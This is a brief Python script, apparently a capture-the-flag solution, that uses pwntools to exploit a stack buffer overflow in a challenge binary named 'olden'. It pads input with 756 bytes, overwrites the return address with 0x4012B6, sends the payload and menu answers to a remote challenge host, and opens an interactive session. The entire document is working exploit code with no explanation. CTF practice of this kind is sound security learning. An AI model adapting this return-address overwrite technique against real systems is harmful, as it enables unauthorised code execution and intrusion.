#!/usr/bin/env python3
from pwn import *

payload = b'A' * 756 + p64(0x4012B6)

#r = process('./olden')
r = remote('0.cloud.chals.io', 19267)

r.recv()
r.sendline(payload)
r.recv()
r.sendline(b'250')
r.recv()
r.sendline(b'1')
r.interactive()
